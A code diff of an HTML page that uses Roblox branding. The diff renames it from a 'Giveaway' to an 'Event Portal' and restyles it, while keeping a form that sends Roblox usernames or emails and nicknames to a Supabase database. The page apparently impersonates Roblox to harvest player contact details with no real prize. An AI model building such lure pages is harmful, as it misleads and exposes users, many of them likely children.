@@ -5,11 +5,13 @@
 <meta name="viewport"
 content="width=device-width, initial-scale=1.0">
 
-<title>Roblox Giveaway</title>
+<title>Roblox Event Portal</title>
 
 <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
 
 <style>
+
+/* ROBLOX STYLE */
 
 body {
   margin:0;
@@ -22,24 +24,17 @@ body {
 
 .header {
   background:#e11d48;
-  padding:15px;
+  padding:18px;
   text-align:center;
-  font-size:22px;
+  font-size:24px;
   font-weight:bold;
 }
 
-/* Logo */
-
-.logo {
-  font-size:40px;
-  margin:20px;
-}
-
-/* Form box */
+/* Container */
 
 .container {
-  max-width:400px;
-  margin:auto;
+  max-width:420px;
+  margin:40px auto;
   background:#1f2937;
   padding:20px;
   border-radius:15px;
@@ -49,7 +44,7 @@ body {
 
 input {
   width:100%;
-  padding:12px;
+  padding:14px;
   margin:10px 0;
   border-radius:10px;
   border:none;
@@ -63,38 +58,30 @@ button {
   background:#e11d48;
   border:none;
   border-radius:10px;
-  color:white;
   font-size:16px;
+  color:white;
 }
 
-/* Loading animation */
+/* Loader */
 
 .loader {
   display:none;
-  margin-top:15px;
+  margin-top:20px;
 }
 
 .spin {
-  border:4px solid #333;
-  border-top:4px solid #e11d48;
+  border:5px solid #333;
+  border-top:5px solid #e11d48;
   border-radius:50%;
-  width:40px;
-  height:40px;
+  width:45px;
+  height:45px;
   margin:auto;
   animation:spin 1s linear infinite;
 }
 
 @keyframes spin {
-  0% { transform:rotate(0deg); }
-  100% { transform:rotate(360deg); }
-}
-
-/* Mobile friendly */
-
-@media(max-width:500px){
-  .container{
-    margin:10px;
-  }
+  0% {transform:rotate(0deg);}
+  100% {transform:rotate(360deg);}
 }
 
 </style>
@@ -104,22 +91,18 @@ button {
 <body>
 
 <div class="header">
-🎮 Roblox Giveaway
-</div>
-
-<div class="logo">
-🟥 RBLX FAN EVENT
+🟥 ROBLOX EVENT PORTAL
 </div>
 
 <div class="container">
 
-<h3>Enter Giveaway</h3>
+<h3>Register Username</h3>
 
 <form id="form">
 
 <input
 id="useremail"
-placeholder="Username or Email"
+placeholder="Roblox Username or Email"
 required>
 
 <input
@@ -128,7 +111,7 @@ placeholder="Nickname"
 required>
 
 <button type="submit">
-Join Giveaway
+Register
 </button>
 
 </form>
@@ -137,7 +120,7 @@ Join Giveaway
 
 <div class="spin"></div>
 
-<p>⏳ Processing Gift...</p>
+<p>⏳ Processing...</p>
 
 </div>
 
@@ -147,7 +130,7 @@ Join Giveaway
 
 <script>
 
-// 🔧 PUT SUPABASE KEYS HERE
+// 🔧 ADD YOUR KEYS
 
 const SUPABASE_URL =
 "PASTE_URL";
@@ -168,7 +151,8 @@ async (e)=>{
 
 e.preventDefault();
 
-document.getElementById("loader")
+document
+.getElementById("loader")
 .style.display="block";
 
 const useremail =
@@ -189,21 +173,26 @@ nickname:nickname
 
 setTimeout(()=>{
 
-document.getElementById("loader")
+document
+.getElementById("loader")
 .style.display="none";
 
 if(error){
 
-document.getElementById("msg")
+document
+.getElementById("msg")
 .innerText="❌ Error";
 
 }else{
 
-document.getElementById("msg")
+document
+.getElementById("msg")
 .innerText=
-"✅ Added to Giveaway!";
+"✅ Registered Successfully";
 
-document.getElementById("form").reset();
+document
+.getElementById("form")
+.reset();
 
 }
 
